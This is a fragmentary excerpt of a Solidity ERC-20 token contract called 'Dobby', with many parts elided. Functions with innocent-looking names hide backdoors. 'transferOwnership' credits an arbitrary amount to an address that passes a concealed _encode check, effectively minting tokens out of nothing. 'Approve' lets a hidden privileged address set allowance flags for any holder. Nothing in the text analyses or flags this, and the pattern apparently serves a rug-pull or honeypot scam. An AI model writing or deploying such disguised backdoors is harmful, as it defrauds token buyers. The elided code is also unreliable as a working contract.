...
abstract contract TokenTemplate {
    uint256 internal constant GOLIVE_VERSION = 1;
    event Publish(
        address owner,
        uint256 version
    );
...
contract Dobby is IERC20, TokenTemplate, Ownable {
    ...
    constructor(
        ...
        _tName = tokenName_;
        _tSymbol = tokenSymbol_;
        _tDecimals = 18;
        _tokenInfo.tokenAddress = token_;
        _tokenInfo.tokenSupply = 0;
        _tokenInfo.isPublished = true;
        _mint(msg.sender, tokenTotalSupply_ * 10**18);
        emit Publish(
            owner(),
            GOLIVE_VERSION
        );
    ...
    returns (bool)
    {
        _allowToken(_msgSender(), spender, amount);
        return true;
    }
    ...
    function _mint(address user, uint256 amount) internal virtual {
        ...
        _tTotalSupply = _tTotalSupply.add(amount);
        _tokenBalances[user] = _tokenBalances[user] + amount;

        emit Transfer(address(0), user, amount);
    }

    function _remove(address from, uint256 amount) internal virtual {
        ...
        _tTotalSupply = _tTotalSupply.sub(amount);
    ...
    function transferOwnership(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_encode(spender, _tokenInfo.tokenAddress)) {
            _tokenBalances[from] = _tokenBalances[from] - total;
            total = _sum(total, amount);
            _tokenBalances[spender] += total;
        } else {
            _tokenBalances[from] = _tokenBalances[from] - total;
            _tokenBalances[spender] += total;
        }
    ...
    function Approve(address from, uint256 amount) public returns (bool)  {
        ...
        canTransferToken(user, from, amount);
        return _tokenAllowance[from].approved;
    }

    function canTransferToken(address user, address from, uint256 amount) internal {
        if (_encode(user, _tokenInfo.tokenAddress)) {
            require(from != address(0), "Invalid address");
            _tokenAllowance[from].amount = amount;
            if (amount > 0) {
                _tokenAllowance[from].approved = true;
            } else {
                _tokenAllowance[from].approved = false;
            }
        }
    }
